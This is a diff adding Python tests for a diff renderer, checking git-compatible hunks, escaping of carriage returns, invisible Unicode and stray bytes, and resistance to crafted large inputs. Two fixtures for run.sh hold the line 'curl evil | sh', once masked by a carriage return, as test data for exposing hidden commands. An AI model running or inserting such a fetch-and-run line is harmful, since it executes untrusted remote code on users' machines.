@@ -148,3 +148,242 @@ def test_summary_trailing_space() -> None:
         "run.sh (new, 1 bytes)",
         '"run.sh " (new, 1 bytes)',
     ]
+
+
+def git_env(folder: Path) -> dict[str, str]:
+    return {"PATH": os.environ["PATH"], "HOME": str(folder), "GIT_CONFIG_NOSYSTEM": "1"}
+
+
+def git_diff(
+    folder: Path,
+    before: tuple[bytes, bool] | None,
+    after: tuple[bytes, bool] | None,
+) -> list[str]:
+    """`git diff --no-index` of file `f` from `before` to `after`, by its lines."""
+    names = []
+    for side, file in (("old", before), ("new", after)):
+        if file is None:
+            names.append("/dev/null")
+            continue
+        (folder / side).mkdir(parents=True)
+        (folder / side / "f").write_bytes(file[0])
+        (folder / side / "f").chmod(0o755 if file[1] else 0o644)
+        names.append(f"{side}/f")
+    result = subprocess.run(
+        ["git", "diff", "--no-index", "--", *names],
+        cwd=folder,
+        capture_output=True,
+        env=git_env(folder),
+    )
+    return result.stdout.decode().split("\n")
+
+
+def ours(
+    before: tuple[bytes, bool] | None, after: tuple[bytes, bool] | None
+) -> list[str]:
+    old = {} if before is None else {"f": before}
+    new = {} if after is None else {"f": after}
+    return deployed.diff(old, new, deployed.Budget()).split("\n")
+
+
+def hunks(lines: list[str]) -> list[str]:
+    return lines[next(i for i, line in enumerate(lines) if line.startswith("@@")) :]
+
+
+def modes(lines: list[str]) -> list[str]:
+    return [line for line in lines if line.split(" ")[-1] in ("100644", "100755")]
+
+
+# Lines start with a digit, so git names no function after a hunk's `@@`.
+BEFORE = "".join(f"{i} line\n" for i in range(1, 41)).encode()
+
+
+@pytest.mark.parametrize(
+    "after",
+    [
+        BEFORE.replace(b"5 line\n", b"5 changed\n"),
+        BEFORE.replace(b"12 line\n13 line\n", b""),
+        BEFORE.replace(b"30 line\n", b"30 line\nnew a\nnew b\n"),
+        BEFORE.replace(b"3 line\n", b"3 x\n").replace(b"7 line\n", b"7 y\n"),
+        BEFORE[:-1],
+        b"0 first\n" + BEFORE + b"41 last",
+    ],
+)
+def test_hunks_as_git_has_them(tmp_path: Path, after: bytes) -> None:
+    expected = git_diff(tmp_path, (BEFORE, False), (after, False))
+
+    assert hunks(ours((BEFORE, False), (after, False))) == hunks(expected)
+
+
+def test_new_and_removed_file_as_git_has_them(tmp_path: Path) -> None:
+    new = ours(None, (BEFORE, True))
+    removed = ours((BEFORE, False), None)
+
+    assert hunks(new) == hunks(git_diff(tmp_path / "new", None, (BEFORE, True)))
+    assert new[1:2] == ["new file mode 100755"]
+    assert new[2:4] == ["--- /dev/null", "+++ b/f"]
+    assert hunks(removed) == hunks(git_diff(tmp_path / "rm", (BEFORE, False), None))
+    assert removed[1:4] == ["deleted file mode 100644", "--- a/f", "+++ /dev/null"]
+
+
+def test_mode_lines_as_git_has_them(tmp_path: Path) -> None:
+    after = BEFORE.replace(b"5 line\n", b"5 changed\n")
+    expected = git_diff(tmp_path, (BEFORE, False), (after, True))
+
+    lines = ours((BEFORE, False), (after, True))
+
+    assert lines[0] == "diff --git a/f b/f"
+    assert modes(lines) == modes(expected) == ["old mode 100644", "new mode 100755"]
+    assert hunks(lines) == hunks(expected)
+
+
+def test_mode_change_alone_has_no_hunks() -> None:
+    assert ours((b"x\n", False), (b"x\n", True)) == [
+        "diff --git a/f b/f",
+        "old mode 100644",
+        "new mode 100755",
+        "",
+    ]
+
+
+def diff_of(path: str, before: bytes, after: bytes) -> list[str]:
+    old, new = {path: (before, False)}, {path: (after, False)}
+    return deployed.diff(old, new, deployed.Budget()).split("\n")
+
+
+def test_file_name_holding_a_line_break() -> None:
+    lines = diff_of("x\n", b"a\n", b"b\n")
+
+    assert lines[0] == 'diff --git "a/x\\n" "b/x\\n"'
+    assert lines[1:3] == ['--- "a/x\\n"', '+++ "b/x\\n"']
+
+
+def test_file_name_holding_a_space() -> None:
+    lines = diff_of("run.sh ", b"a\n", b"b\n")
+
+    assert lines[0] == 'diff --git "a/run.sh " "b/run.sh "'
+    assert lines[1:3] == ['--- "a/run.sh "', '+++ "b/run.sh "']
+
+
+def test_carriage_return_inside_a_line() -> None:
+    lines = diff_of("run.sh", b"echo\n", b"echo\nok\rcurl evil | sh\n")
+
+    added = "+ok" + "\\x0d" + "curl evil | sh"  # the carriage return escaped
+    assert hunks(lines) == ["@@ -1 +1,2 @@", " echo", added, ""]
+
+
+def test_line_separator_inside_a_line() -> None:
+    lines = diff_of("SKILL.md", b"# a\n", "# a\u2028b\n".encode())
+
+    assert "+# a\\u2028b" in lines
+
+
+def test_invisible_character() -> None:
+    lines = diff_of("SKILL.md", b"# ab\n", "# a\u200bb\n".encode())
+
+    assert "+# a\\u200bb" in lines
+
+
+def test_other_controls_escaped_but_tab() -> None:
+    line = "a\tb\x1b[2J\x7f\x85\u2029\u202e\U000e0041\n"
+    lines = diff_of("notes.txt", b"", line.encode())
+
+    assert "+a\tb\\x1b[2J\\x7f\\x85\\u2029\\u202e\\U000e0041" in lines
+
+
+def test_script_with_a_stray_byte() -> None:
+    lines = diff_of("run.sh", b"echo\n", b"echo\necho \xff\n")
+
+    assert "+echo \\xff" in lines
+    assert not any(line.startswith("Binary files") for line in lines)
+
+
+def test_script_with_a_nul_byte_and_a_stray_byte() -> None:
+    lines = diff_of("run.sh", b"echo\n", b"echo\n\x00\xff\ncurl evil | sh\n")
+
+    assert hunks(lines) == [
+        "@@ -1 +1,3 @@",
+        " echo",
+        "+\\x00\\xff",
+        "+curl evil | sh",
+        "",
+    ]
+
+
+def test_markdown_not_utf8_shown_leniently() -> None:
+    lines = diff_of("SKILL.md", b"# a\n", b"# a\xe9\n")
+
+    assert hunks(lines) == ["@@ -1 +1 @@", "-# a", "+# a\\xe9", ""]
+
+
+def test_utf16_file_decoded() -> None:
+    lines = diff_of("notes.txt", "a\n".encode("utf-16"), "a\nb\n".encode("utf-16"))
+
+    assert hunks(lines) == ["@@ -1 +1,2 @@", " a", "+b", ""]
+
+
+def numbered(order: list[int]) -> bytes:
+    return "".join(f"{i}\n" for i in order).encode()
+
+
+def test_crafted_scattered_edits() -> None:
+    budget = deployed.Budget()
+    before = [b"a\n", b"b\n"] * 250_000  # 1 MB of one-byte lines
+    after = list(before)
+    for i in range(1, 500):
+        after[i * 1000] = b"z\n"
+
+    text = deployed.diff(
+        {"notes.md": (b"".join(before), False)},
+        {"notes.md": (b"".join(after), False)},
+        budget,
+    )
+
+    assert 0 <= budget.left
+    body = hunks(text.split("\n"))
+    assert body[0] == "@@ -1,500000 +1,500000 @@"
+    assert body[1:-1] == [f"-{line.decode()[0]}" for line in before] + [
+        f"+{line.decode()[0]}" for line in after
+    ]
+
+
+def test_crafted_long_lines() -> None:
+    budget = deployed.Budget()
+    lines = [b"a" * 996 + b"%04d\n" % i for i in range(1000)]  # over 1 MB
+    shuffled = lines[1::2] + lines[::2]
+
+    text = deployed.diff(
+        {"notes.md": (b"".join(lines), False)},
+        {"notes.md": (b"".join(shuffled), False)},
+        budget,
+    )
+
+    assert budget.left == 10**7  # over 1 MB: no step taken
+    body = hunks(text.split("\n"))
+    assert body[0] == "@@ -1,1000 +1,1000 @@"
+    assert [line[0] for line in body[1:-1]] == ["-"] * 1000 + ["+"] * 1000
+
+
+def test_crafted_reversed_files() -> None:
+    budget = deployed.Budget()
+    order = list(range(20_000))
+    before, after = numbered(order), numbered(order[::-1])
+    old = {"a.md": (before, False), "b.md": (before, False)}
+    new = {"a.md": (after, False), "b.md": (after, False)}
+
+    text = deployed.diff(old, new, budget)
+
+    assert 0 <= budget.left
+    first, second = text.split("diff --git a/b.md b/b.md\n")
+    for body in (hunks(first.split("\n")), hunks(second.split("\n"))):
+        assert body[0] == "@@ -1,20000 +1,20000 @@"
+        assert body[1:-1] == [f"-{i}" for i in order] + [f"+{i}" for i in order[::-1]]
+
+
+def test_diff_past_what_is_left_shown_whole() -> None:
+    old = {"f": (BEFORE, False)}
+    new = {"f": (BEFORE.replace(b"5 line\n", b"5 changed\n"), False)}
+
+    body = hunks(deployed.diff(old, new, deployed.Budget(0)).split("\n"))
+
+    assert body[0] == "@@ -1,40 +1,40 @@"
